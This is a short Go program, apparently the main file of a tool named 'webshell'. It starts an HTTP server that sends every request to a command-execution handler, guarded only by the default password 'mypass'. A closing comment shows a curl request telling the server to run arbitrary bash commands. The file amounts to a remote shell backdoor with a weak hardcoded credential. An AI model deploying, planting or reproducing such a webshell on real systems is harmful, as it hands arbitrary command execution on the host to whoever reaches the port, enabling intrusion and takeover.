package main

import (
	"flag"
	"log"
	"net/http"
	"webshell/lib/http/handlers"
)

func main() {
	handlers.RequiredPassword = flag.String("pass", "mypass", "passwd")
	addr := flag.String("addr", ":9090", "bind addr and port")

	flag.Parse()

	http.HandleFunc("/", handlers.ExecuteCommand)

	log.Printf("start http server\n")
	log.Fatal(http.ListenAndServe(*addr, nil))
}

// curl -X POST -d '{"pass": "mypass", "cmd": "bash", "opt": "-c", "args": "ls -l ~; echo hello"}' http://localhost:9090
